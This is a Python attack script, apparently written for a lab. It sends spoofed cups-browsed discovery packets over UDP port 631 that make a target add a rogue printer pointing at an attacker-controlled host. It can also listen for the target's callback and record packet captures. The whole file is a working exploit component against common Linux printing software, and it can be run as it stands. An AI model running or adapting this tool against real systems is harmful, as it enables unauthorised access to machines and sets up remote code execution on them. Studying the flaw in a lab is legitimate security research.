import argparse
import time
import socket
import threading
import logging
from scapy.all import IP, UDP, Raw, send, wrpcap, AsyncSniffer
from cups_logging import setup_logging

def build_browse_string(atk_ip, atk_port, ptype=0, pstate=3, pname="Printer"):
    """Build a CUPS Browse Protocol string: '<type> <state> <uri>\\n' as bytes."""
    uri = f"http://{atk_ip}:{atk_port}/printers/{pname}"
    browse = f"{ptype} {pstate} {uri}\n"
    return browse.encode()

def add_attack_arguments(parser):
    """Add the attack tool's command-line arguments to a parser."""
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-a", "--atk-ip", required=True, help="Attacker IP address")
    parser.add_argument("-p","--atk-port", type=int, default=9100, help="Attacker port")

    parser.add_argument("--ptype", type=int, default=0, help="Printer type")
    parser.add_argument("--pstate", type=int, default=3, help="Printer state")
    parser.add_argument("--pname", default="Printer", help="Printer name")
    
    parser.add_argument("-c", "--count", type=int, default=1, help="Number of packets to send")
    
    parser.add_argument("--timeout", type=int, default=3, help="Seconds for packet capture")
    parser.add_argument("--pcap", help="Save packet(s) to pcap file")
    parser.add_argument("--iface", help="Interface for packet capture")
    parser.add_argument("--listen", action="store_true", help="Listen for callback")
    parser.add_argument("--log", help="Filename for logs")

def start_listener(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", port))
    sock.listen()
    conn, address = sock.accept()
    data = conn.recv(4096)
    logging.warning(f"Callback from {address[0]} - {len(data)} bytes")
    conn.close()
    sock.close()

def run_attack(args):
    """Build and send the attack packet based on the args."""
    log = setup_logging(args.log)

    payload = build_browse_string(args.atk_ip, args.atk_port, args.ptype, args.pstate, args.pname)

    pkt = IP(dst=args.target) / UDP(sport=631, dport=631) / Raw(load=payload)


    log.info(f"Target: {args.target}:631")
    log.info(f"Attacker IP: {args.atk_ip}, Port: {args.atk_port}")
    log.info(f"Payload: {payload}")

    if args.listen:
        threading.Thread(target=start_listener, args=(args.atk_port,), daemon=True).start()
        time.sleep(0.5)

    if args.pcap and not args.iface:
        print("[!] --pcap requires --iface")
        return

    sniffer = None
    if args.pcap:
        bpf = f"udp port 631 or tcp port {args.atk_port}"
        sniffer = AsyncSniffer(filter=bpf, iface=args.iface)
        sniffer.start()
        time.sleep(0.5)

    for i in range(args.count):
        send(pkt, verbose=False)
        log.info(f"Sent packet {i + 1}/{args.count}")

    if args.listen or args.pcap:
        time.sleep(args.timeout)

    if args.pcap:
        sniffer.stop()
        wrpcap(args.pcap, sniffer.results)
        log.info(f"Saved {len(sniffer.results)} packets to {args.pcap}")

def main():
    parser = argparse.ArgumentParser(
        description="CUPS Attack Tool - sends crafted cups-browsed discovery packets",
        epilog="Example (all options):\n"
               "  sudo python3 cups_attack.py -t 172.18.0.2 -a 172.18.0.1 -p 9100 \\\n"
               "      --ptype 0 --pstate 3 --pname Printer -c 1 \\\n"
               "      --listen --pcap pcap_files/attack.pcap --iface br-954f941dcf7f \\\n"
               "      --timeout 3 --log evidence/attack.log",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    add_attack_arguments(parser)
    args = parser.parse_args()
    run_attack(args)


if __name__ == "__main__":
    main()
